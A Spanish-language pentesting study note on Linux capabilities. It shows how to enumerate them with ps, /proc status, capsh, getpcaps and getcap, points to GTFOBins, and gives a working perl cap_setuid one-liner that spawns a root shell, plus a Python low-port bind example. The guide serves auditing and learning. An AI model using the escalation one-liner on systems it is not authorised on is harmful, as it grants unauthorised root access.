-- -
Las **capabilities** son una característica de seguridad en sistemas Linux que permite otorgar privilegios específicos a procesos individuales, sin la necesidad de darles acceso completo como superusuario (**root**). Esto permite que los programas realicen tareas que normalmente requieren privilegios elevados, mejorando así la seguridad al minimizar el acceso innecesario.

---
### 🔎 **Comandos para Identificar Capabilities**

#### 🧩 **Visualización de Procesos Activos**
Para ver los procesos en ejecución junto con sus **PIDs**:
```bash
ps -faux
```
- **f:** Muestra el árbol de procesos completo.
- **a:** Muestra procesos de otros usuarios.
- **u:** Muestra el propietario.
- **x:** Incluye procesos sin terminal asociado.

---

#### 📊 **Ver Capabilities Asociadas a un Proceso**
Podemos verificar qué **capabilities** tiene un proceso utilizando su **PID**:
```bash
cat /proc/$PID/status | grep Cap
```
- **CapInh:** Capabilities heredadas.
- **CapPrm:** Capabilities permitidas.
- **CapEff:** Capabilities efectivas.
- **CapBnd:** Capabilities vinculadas.

#### 🔍 **Decodificar Capabilities**
Para ver las capabilities en formato legible:
```bash
capsh --decode=000000003000
```
- **capsh:** Utilidad para trabajar con capabilities.
- **--decode:** Muestra las capabilities en texto claro.

#### 🗺️ **Otra Forma de Ver Capabilities**
Podemos usar el siguiente comando para obtener directamente las **capabilities** de un proceso:
```bash
getpcaps $PID
```
- **getpcaps:** Muestra las capabilities activas de un proceso.  

---

## 🌐 **Barrido a Nivel de Sistema para Buscar Capabilities**
Podemos realizar un escaneo completo para encontrar binarios con capabilities activas:
```bash
getcap -r / 2>/dev/null
```
- **-r /:** Escanea recursivamente el sistema desde la raíz.
- **2>/dev/null:** Suprime mensajes de error de acceso.

---

### 💥 **Explotación de Capabilities**
Una vez identificados los binarios con capabilities activas, podemos buscar su explotación en la página [GTFOBins](https://gtfobins.github.io).  
Este sitio proporciona ejemplos de explotación para múltiples binarios comunes en Linux.  

---

### 🔑 **Ejemplos de Explotación de Capabilities**

#### 🧨 **Ejemplo 1: Capacidad `cap_setuid` con Perl**
Si el binario `perl` tiene la capacidad `cap_setuid+ep`, podríamos escalar privilegios así:
```bash
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

#### 🐚 **Ejemplo 2: Capacidad `cap_net_bind_service` con Python**
Si el binario `python` tiene la capacidad `cap_net_bind_service+ep`, podríamos crear un servidor en un puerto bajo:
```bash
python -c 'import socket; s=socket.socket(); s.bind(("0.0.0.0", 80)); s.listen(5); print("Listening on port 80");'
```

---

### 🚩 **Consejos de Seguridad**
1. **Revisa periódicamente las capabilities activas:** Las capacidades innecesarias pueden ser un riesgo.  
2. **Restringe el uso de capabilities críticas:** Como `cap_setuid` y `cap_net_admin`.  
3. **Monitorea procesos sospechosos:** Utiliza herramientas como `pspy` o `lsof` para identificar procesos anómalos.  

---

💡 **Guarda esta guía en Obsidian para tener siempre a mano las técnicas de auditoría y explotación de capabilities en Linux!** 💻